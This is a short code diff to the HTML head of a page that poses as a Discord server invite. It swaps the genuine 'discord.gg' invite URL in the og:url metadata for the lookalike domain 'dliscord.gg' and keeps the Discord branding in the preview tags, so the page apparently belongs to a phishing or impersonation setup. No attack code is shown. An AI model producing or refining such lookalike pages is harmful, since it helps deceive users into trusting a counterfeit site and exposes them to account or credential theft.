@@ -3,7 +3,7 @@
   <head>
     <link rel="stylesheet" href="../assest/style.css"/>
     <meta property="og:site_name" content="Discord">
-    <meta property="og:url" content="https://discord.gg/domiinant">
+    <meta property="og:url" content="https://dliscord.gg/domiinant">
     <meta property="og:title" content="Discord">
     <meta property="og:description" content="You Have Been Invited In Dominant">
     <meta property="og:type" content="Discord">
